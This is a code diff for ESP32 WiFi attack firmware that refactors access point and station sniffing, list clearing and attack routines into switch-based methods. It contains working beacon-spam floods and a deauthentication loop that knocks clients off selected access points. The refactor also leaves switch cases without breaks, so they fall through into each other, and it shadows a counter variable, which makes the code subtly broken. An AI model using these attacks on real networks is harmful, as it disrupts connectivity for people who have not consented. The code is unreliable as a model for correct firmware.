@@ -12,90 +12,6 @@ String WiFiModule::freeRAM()
   return String(s);
 }
 
-void WiFiModule::RunStaScan()
-{
-#ifdef OLD_LED
-  rgbmodule->setColor(HIGH, LOW, HIGH);
-#endif
-  delete access_points;
-  access_points = new LinkedList<AccessPoint>();
-
-  uint8_t set_channel = random(1, 12);
-
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
-  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-  this->wifi_initialized = true;
-  initTime = millis();
-
-  while (this->wifi_initialized)
-  {
-     unsigned long startTime = millis();
-    if (millis() - startTime < 3000)
-    {
-      uint8_t set_channel = random(1, 13);
-      esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-    }
-  }
-
-}
-
-void WiFiModule::RunAPScan()
-{
-#ifdef OLD_LED
-  rgbmodule->setColor(HIGH, LOW, HIGH);
-#endif
-
-  delete access_points;
-  access_points = new LinkedList<AccessPoint>();
-
-  uint8_t set_channel = random(1, 12);
-
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
-  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-  this->wifi_initialized = true;
-  initTime = millis();
-
-  while (this->wifi_initialized)
-  {
-    unsigned long startTime = millis();
-    if (millis() - startTime < 3000)
-    {
-      uint8_t set_channel = random(1, 13);
-      esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-    }
-  }
-}
-
-int WiFiModule::clearAPs() {
-  int num_cleared = access_points->size();
-  while (access_points->size() > 0)
-    access_points->remove(0);
-  return num_cleared;
-}
-
-int WiFiModule::clearStations() {
-  int num_cleared = stations->size();
-  stations->clear();
-
-  // Now clear stations list from APs
-  for (int i = 0; i < access_points->size(); i++)
-    access_points->get(i).stations->clear();
-    
-  return num_cleared;
-}
-
 void WiFiModule::insertTimestamp(uint8_t *packet)
 {
   struct timeval now;
@@ -194,64 +110,167 @@ bool WiFiModule::addSSID(String essid) {
   return true;
 }
 
-int WiFiModule::clearSSIDs() {
-  int num_cleared = ssids->size();
-  ssids->clear();
-  Serial.println("ssids: " + (String)ssids->size());
-  return num_cleared;
+void WiFiModule::Scan(ScanType type)
+{
+#ifdef OLD_LED
+  rgbmodule->setColor(HIGH, LOW, HIGH);
+#endif
+
+  switch (type)
+  {
+    case ScanType::SCAN_AP:
+    {
+        delete access_points;
+        access_points = new LinkedList<AccessPoint>();
+
+        uint8_t set_channel = random(1, 12);
+
+        esp_wifi_init(&cfg);
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        esp_wifi_set_mode(WIFI_MODE_NULL);
+        esp_wifi_start();
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_filter(&filt);
+        esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
+        esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+        this->wifi_initialized = true;
+        initTime = millis();
+
+        while (this->wifi_initialized)
+        {
+          unsigned long startTime = millis();
+          if (millis() - startTime < 3000)
+          {
+            uint8_t set_channel = random(1, 13);
+            esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+          }
+        }
+    }
+    case ScanType::SCAN_STA:
+    {
+      delete stations;
+      stations = new LinkedList<Station>();
+
+      uint8_t set_channel = random(1, 12);
+
+      esp_wifi_init(&cfg);
+      esp_wifi_set_storage(WIFI_STORAGE_RAM);
+      esp_wifi_set_mode(WIFI_MODE_NULL);
+      esp_wifi_start();
+      esp_wifi_set_promiscuous(true);
+      esp_wifi_set_promiscuous_filter(&filt);
+      esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
+      esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+      this->wifi_initialized = true;
+      initTime = millis();
+
+      while (this->wifi_initialized)
+      {
+        unsigned long startTime = millis();
+        if (millis() - startTime < 3000)
+        {
+          uint8_t set_channel = random(1, 13);
+          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+        }
+      }
+    }
+  }
 }
 
 void WiFiModule::getMACatoffset(char *addr, uint8_t* data, uint16_t offset) {
   sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
 }
 
-void WiFiModule::broadcastRickroll()
+int WiFiModule::ClearList(ClearType type)
+{
+  int num_cleared;
+
+  switch (type)
+  {
+    case ClearType::CT_AP:
+    {
+      int num_cleared = access_points->size();
+      access_points->clear();
+    }
+    case ClearType::CT_SSID:
+    {
+      num_cleared = ssids->size();
+      ssids->clear();
+      Serial.println("ssids: " + (String)ssids->size());
+    }
+    case ClearType::CT_STA:
+    {
+      num_cleared = stations->size();
+      stations->clear();
+
+      for (int i = 0; i < access_points->size(); i++)
+        access_points->get(i).stations->clear();
+    }
+  }
+  return num_cleared;
+}
+
+void WiFiModule::Attack(AttackType type)
 {
 #ifdef OLD_LED
     rgbmodule->setColor(0, 1, 1);
 #endif
-    while (wifi_initialized)
+
+  switch (type)
+  {
+    case AttackType::AT_Rickroll:
     {
-        for (int i = 0; i < 12; i++)
+      while (wifi_initialized)
+      {
+          for (int i = 0; i < 12; i++)
+          {
+              for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
+              {
+                broadcastSetSSID(rick_roll[x], i);
+              }
+          }
+          delay(1);
+      }
+    }
+    case AttackType::AT_RandomSSID:
+    {
+      while (wifi_initialized)
+      {
+        broadcastRandomSSID();
+        delay(1);
+      }
+    }
+    case AttackType::AT_ListSSID:
+    {
+      while (wifi_initialized)
+      {
+        for (int x = 0; x < 12; x++)
         {
-            for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
-            {
-              broadcastSetSSID(rick_roll[x], i);
-            }
+          for (int i = 0; i < ssids->size(); i++)
+          {
+            broadcastSetSSID(ssids->get(i).essid.c_str(), x);
+          }
         }
         delay(1);
+      }
     }
-    
-}
-
-void WiFiModule::InitRandomSSIDAttack()
-{
-#ifdef OLD_LED
-    rgbmodule->setColor(0, 1, 1);
-#endif
-    while (wifi_initialized)
+    case AttackType::AT_DeauthAP:
     {
-      broadcastRandomSSID();
-      delay(1);
-    }
-}
-
-void WiFiModule::InitListSSIDAttack()
-{
-#ifdef OLD_LED
-    rgbmodule->setColor(0, 1, 1);
-#endif
-    while (wifi_initialized)
-    {
-      for (int x = 0; x < 12; x++)
-      {
-        for (int i = 0; i < ssids->size(); i++)
-        {
-          broadcastSetSSID(ssids->get(i).essid.c_str(), x);
+        while(wifi_initialized){
+        for(int i = 0; i < access_points->size(); i++){
+        AccessPoint ap = access_points->get(i);
+        if (ap.selected) {
+          for (int i = 0; i < ap.stations->size(); i++) {
+            Station cur_sta = stations->get(ap.stations->get(i));
+              for (int y = 0; y < 25; y++) {
+                sendDeauthFrame(ap.bssid, ap.channel, cur_sta.mac);
+              }
+            }
+          }
         }
       }
-      delay(1);
     }
+  }
 }
 
 void WiFiModule::broadcastSetSSID(const char* ESSID, uint8_t channel) {
@@ -290,26 +309,6 @@ void WiFiModule::broadcastSetSSID(const char* ESSID, uint8_t channel) {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
     packets_sent + 6;
-}
-
-void WiFiModule::broadcastDeauthAP(){
-  #ifdef OLD_LED
-    rgbmodule->setColor(0, 1, 1);
-  #endif
-
-  while(wifi_initialized){
-    for(int i = 0; i < access_points->size(); i++){
-     AccessPoint ap = access_points->get(i);
-     if (ap.selected) {
-      for (int i = 0; i < ap.stations->size(); i++) {
-        Station cur_sta = stations->get(ap.stations->get(i));
-          for (int y = 0; y < 25; y++) {
-            sendDeauthFrame(ap.bssid, ap.channel, cur_sta.mac);
-          }
-        }
-      }
-    }
-  }
 }
 
 void WiFiModule::RunSetup()
